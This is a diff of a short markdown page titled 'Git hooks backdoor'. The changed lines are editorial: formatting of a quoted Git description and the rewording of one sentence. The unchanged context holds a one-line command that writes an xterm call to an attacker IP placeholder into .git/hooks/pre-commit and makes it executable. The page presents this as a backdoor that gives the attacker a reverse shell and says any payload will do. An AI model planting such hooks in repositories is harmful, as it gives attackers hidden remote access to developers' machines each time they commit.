@@ -1,7 +1,7 @@
 Git hooks "backdoor"
 ======================
 
-"*...Like many other Version Control Systems, Git has a way to fire off custom scripts when certain important actions occur. There are two groups of these hooks: client-side and server-side. Client-side hooks are triggered by operations such as committing and merging, while server-side hooks run on network operations such as receiving pushed commits. * **You can use these hooks for all sorts of reasons...**"
+"*...Like many other Version Control Systems, Git has a way to fire off custom scripts when certain important actions occur. There are two groups of these hooks: client-side and server-side. Client-side hooks are triggered by operations such as committing and merging, while server-side hooks run on network operations such as receiving pushed commits. You can use these hooks for all sorts of reasons...*"
 
 **Video**
 
@@ -14,5 +14,5 @@ echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit; chmod +x .git/h
 
 ```
 
-You can use whatever payload you want to exploit, using lame xterm to visually show off payload execution reversing a shell to attacker.
+You can use whatever payload you want to exploit, using lame xterm to visually show off payload execution to get a reverse shell to attacker.
 
